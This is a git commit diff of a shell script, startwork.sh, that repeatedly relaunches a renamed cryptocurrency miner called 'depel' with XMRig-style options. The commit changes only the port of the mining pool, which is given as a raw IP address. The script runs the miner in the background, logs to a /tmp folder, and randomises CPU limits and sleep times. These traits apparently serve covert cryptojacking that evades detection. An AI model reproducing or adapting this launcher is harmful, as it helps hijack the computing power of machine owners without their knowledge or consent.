71f2d1c89b6fb540c21249c23080114e6b48fcdf
githubec <57689795+githubec@users.noreply.github.com>
2019-11-12 21:24:22 -0200

    Update startwork.sh

--- startwork.sh
+++ startwork.sh
@@ -6,7 +6,7 @@ do
  CPU=$(( 55 + $(date +%N) % 35 ))
  TIM=$(( 180 + $(date +%N) % 130 ))
  pkill depel
- depel -o 185.251.39.208:34332 --rig-id=$ID -B -l /tmp/beauty/depel.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1
+ depel -o 185.251.39.208:44533 --rig-id=$ID -B -l /tmp/beauty/depel.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1
  echo -e 'ALL WORKS! tail -f /tmp/beauty/depel.log' $CPU $TIM
  sleep $TIM;
 done;
